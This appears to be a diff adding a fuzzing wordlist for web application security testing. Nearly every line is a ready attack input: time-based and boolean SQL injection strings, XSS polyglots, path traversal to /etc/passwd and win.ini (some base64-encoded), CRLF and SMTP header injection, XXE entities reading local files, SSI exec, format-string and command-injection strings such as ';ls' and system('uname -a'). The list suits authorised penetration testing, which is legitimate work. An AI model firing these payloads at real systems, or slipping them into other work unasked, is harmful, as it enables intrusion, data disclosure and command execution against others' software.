@@ -1,0 +1,247 @@
+!@$%^&*()_+=-[]{`}~\|;':"?/>.<,#
+#,<.>/?":';|\~}`{][-=+_)(*&^%$@!
+~
+!
+@
+#
+$
+%
+^
+&
+*
+(
+)
+_
+_
++
+=
+{
+}
+[
+|
+\
+`
+,
+.
+
+?
+;
+:
+'
+''
+"
+""
+<
+>
+-1
+0
+1
+null
+true
+false
+%00
+%01
+%70
+%20
+%00%00
+NaN
+SLEEP(30) /*‘ or SLEEP(30) or ‘“ or SLEEP(30) or “*/
+SELECT 1,2,IF(SUBSTR(@@version,1,1)<5,BENCHMARK(15000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(15000000,SHA1(0xDE7EC71F1)),SLEEP(30)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(15000000,SHA1(0xDE7EC71F1)),​SLEEP(30)))OR"*/ FROM some_table WHERE ex = ample
+javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
+javascript://'//" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+'"#||+>;
+'--
+';
+"--
+";
+or 9=9
+or 9=9--
+or 9=9;
+ or 9=9--
+ or 9=9;
+' or 9=9--
+' or 9=9;
+" or 9=9--
+" or 9=9;
+' or '9'='9
+' or '9'='9'
+' or '9'='9'--
+' or '9'='9';
+" or "9"="9
+" or "9"="9"
+" or "9"="9"--
+" or "9"="9";
+) or ('9'='9
+)) or ('9'='9
+) or ("9"="9
+)) or ("9"="9
+' or 9=9 or ''='
+" or 9=9 or ""="
+ union all select @@version--
+(select @@fuzzstring)
+select @@fuzzstring
+sleep(10)#
+1 or sleep(10)#
+" or sleep(10)#
+' or sleep(10)#
+" or sleep(10)="
+' or sleep(10)='
+1) or sleep(10)#
+") or sleep(10)="
+') or sleep(10)='
+1)) or sleep(10)#
+")) or sleep(10)="
+')) or sleep(10)='
+;waitfor delay '0:0:10'--
+);waitfor delay '0:0:10'--
+';waitfor delay '0:0:10'--
+";waitfor delay '0:0:10'--
+');waitfor delay '0:0:10'--
+");waitfor delay '0:0:10'--
+));waitfor delay '0:0:10'--
+'));waitfor delay '0:0:10'--
+"));waitfor delay '0:0:10'--
+benchmark(10000000,MD5(1))#
+1 or benchmark(10000000,MD5(1))#
+" or benchmark(10000000,MD5(1))#
+' or benchmark(10000000,MD5(1))#
+1) or benchmark(10000000,MD5(1))#
+") or benchmark(10000000,MD5(1))#
+') or benchmark(10000000,MD5(1))#
+1)) or benchmark(10000000,MD5(1))#
+")) or benchmark(10000000,MD5(1))#
+')) or benchmark(10000000,MD5(1))#
+pg_sleep(10)--
+1 or pg_sleep(10)--
+" or pg_sleep(10)--
+' or pg_sleep(10)--
+1) or pg_sleep(10)--
+") or pg_sleep(10)--
+') or pg_sleep(10)--
+1)) or pg_sleep(10)--
+")) or pg_sleep(10)--
+')) or pg_sleep(10)--
+x'"><SVg/oNLoad=prompt(4)>
+x”><SVg/oNLoad=prompt(4)>
+<meta http-equiv="refresh" content="0;javascript:alert(1)"/>
+../../../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../../etc/passwd%00
+..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\etc\passwd
+..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\etc\passwd%00
+..//..//..//..//..//..//..//..//..//..//..//..//..//..//..//etc//passwd
+..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc\/passwd
+\../\../\../\../\../\../\../\../\../\../\../\../\../\../\../etc/passwd
+Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
+../../../../../../../../../../../../../../../windows/win.ini
+../../../../../../../../../../../../../../../windows/win.ini%00
+../../../../../../../../../../../../../../../boot.ini
+../../../../../../../../../../../../../../../boot.ini%00
+..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\windows\win.ini
+..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\windows\win.ini%00
+..//..//..//..//..//..//..//..//..//..//..//..//..//..//..//windows//win.ini
+Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vd2luZG93cy93aW4uaW5p
+%0d%0aEvilHeader:%20ThisShouldntExist%0d%0a
+%0d%0aContent-Type: text/html%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a%3Chtml%3EEvil content%3C/html%3E
+%0d%0aDATA%0d%0afoo%0d%0a%2e%0d%0aMAIL+FROM:+pentest@coalfire.com%0d%0aRCPT+TO:+pentest@coalfire.com%0d%0aDATA%0d%0aFrom:+pentest@coalfire.com%0d%0aTo:+pentest@coalfire.com%0d%0aSubject:+test%0d%0afoo%0d%0a%2e%0d%0a
+<![CDATA[<test></test>]]>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://c:/boot.ini">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://c:/windows/win.ini">]><foo>&xxe;</foo>
+count(/child::node())
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[' or 1=1 or ''=']]></foof>
+<foo><![CDATA[' or 1=1 or ''=']]></foo>
+&foo;
+%foo;
+*/*
+<pre><!--#exec cmd="ls" --></pre>
+<pre><!--#exec cmd="dir" --></pre>
+<!--#echo var="DOCUMENT_URI" -->
+<!--#echo var="DOCUMENT_NAME" -->
+< > "
+%u003c
+%u003e
+%u0022
+\u0022
+\u003c
+\u003e
+eval("while(1);")
+{"\x00":0}
+{"1":0}
+[]
+{}
+%p%p%p%p
+%x%x%x%x
+%d%d%d%d
+%s%s%s%s
+%n%n%n%n
+;echo fuzzstring
+&& echo fuzzstring
+& echo fuzzstring
+`echo fuzzstring
+//eff.org
+/eff.org
+\eff.org
+https://eff.org
+œ∑´®†¥¨ˆøπ“‘
+⅛⅜⅝⅞
+ЁЂЃЄЅІЇЈ
+⁰⁴⁵₀₁₂
+田中さんにあげて下さい
+사회과학원 어학연구소
+(ﾉಥ益ಥ）ﾉ ┻━┻
+❤️ 💔 💌 💕 💞 💓 💗 💖 💘 💝 💟 💜 💛 💚 💙
+0️⃣ 1️⃣ 2️⃣ 3️⃣ 4️⃣ 
+ما, يذكر االإطلاق عل إيو
+test‪
+‫test‫
+ ¬
+test
+I̗̘̦͝n͇͇͙v̮̫ok̲̫̙͈i̖͙̭̹̠̞n̡̻̮̣̺g̲͈͙̭͙̬͎ ̰t͔̦h̞̲e̢̤ ͍̬̲͖f̴̘͕̣è͖ẹ̥̩l͖͔͚i͓͚̦͠n͖͍̗͓̳̮g͍ ̨o͚̪͡f̘̣̬ ̖̘͖̟͙̮c҉͔̫͖͓͇͖ͅh̵̤̣͚͔á̗̼͕ͅo̼̣̥s̱͈̺̖̦̻͢.̛̖̞̠̫̰
+˙ɐnbᴉlɐ ɐuƃɐɯ ǝɹolop 
+' or 1=1]%00
+!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////etc/passwd">]><foo>&xxe;</foo>
+<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////etc/passwd">]><foo>&xxe;</foo>
+' || 1==1 //
+%0als
+;ls
+%68%61%63%6b%65%72%22%2e%73%79%73%74%65%6d%28%27%75%6e%61%6d%65%20%2d%61%27%29%3b%23
+%69%64%29%3b%7d%73%79%73%74%65%6d%28%27%75%6e%61%6d%65%20%2d%61%27%29%3b%23
+system('uname%20-a')&pattern=/lamer/e&base=Hello lamer
+hacker'.system('uname -a').'
+%26%26ls
+/
+-
+]
+*doctor*
+*checkout*
+http%3A%2F%2Fwww
+http%3A
+q%26a
+**http%3a
+*http%3A
+**http%3A
+http%3A%2F%2Fyoutube
+http%3A%2F%2Fblogs
+http%3A%2F%2Fblog
+**http%3A%2F%2Fwww
+s%26p
+%3FRID%3D2671
+devinmoore*
+*dc_
+*sa_
+/login.wdm%20
+/admin%20/
+/web.config::$DATA
+/Trace.axd::$DATA
+http%3A%2F%2Fcommunity
+Clinton%20Sparks%20%26%20Diddy%20-%20Dont%20Call%20It%20A%20Comeback%28RuZtY%29
+Chamillionaire%20%26%20Paul%20Wall-%20Get%20Ya%20Mind%20Correct
+DJ%20Haze%20%26%20The%20Game%20-%20New%20Blood%20Series%20Pt
+http%3A%2F%2Fradar
+q%26a2
+login%3f
+Shakira%20Oral%20Fixation%201%20%26%202
+http%3A%2F%2Fjeremiahgrossman
+http%3A%2F%2Fweblog
+http%3A%2F%2Fswik
